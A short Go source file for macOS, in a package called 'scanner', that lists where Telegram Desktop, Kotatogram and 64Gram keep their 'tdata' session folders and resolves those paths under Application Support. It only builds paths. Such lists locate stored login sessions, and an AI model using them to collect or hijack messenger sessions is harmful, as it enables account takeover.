//go:build darwin

package scanner

import (
	"os"
	"path/filepath"
)

func getTelegramPaths() []telegramPathConfig {
	return []telegramPathConfig{
		{"Telegram Desktop", "Telegram Desktop/tdata", "appdata"},
		{"Kotatogram", "Kotatogram Desktop/tdata", "appdata"},
		{"64Gram", "64Gram Desktop/tdata", "appdata"},
	}
}

func resolveTelegramBase(base string) string {
	home, _ := os.UserHomeDir()
	switch base {
	case "home", "userprofile":
		return home
	case "appdata":
		return filepath.Join(home, "Library", "Application Support")
	case "localappdata":
		return filepath.Join(home, "Library", "Application Support")
	}
	return ""
}